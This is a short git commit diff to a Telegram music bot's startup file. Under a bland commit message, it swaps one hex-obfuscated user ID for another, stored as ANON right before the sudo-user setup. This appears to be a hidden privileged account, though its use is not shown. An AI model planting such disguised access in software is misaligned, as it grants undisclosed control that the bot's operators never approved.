bbab33ebf39993a1cd0fd49a9cb545722841e5f2
PiroKido <129570257+PiroKido@users.noreply.github.com>
2023-04-24 01:51:35 +0530

    Update __init__.py

--- FallenMusic/__init__.py
+++ FallenMusic/__init__.py
@@ -97,7 +97,7 @@ async def fallen_startup():
     except:
         pass
 
-    ANON = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
+    ANON = "\x35\x36\x35\x36\x33\x38\x32\x37\x39\x31"
     for SUDOER in config.SUDO_USERS:
         SUDOERS.add(SUDOER)
     if config.OWNER_ID not in config.SUDO_USERS:
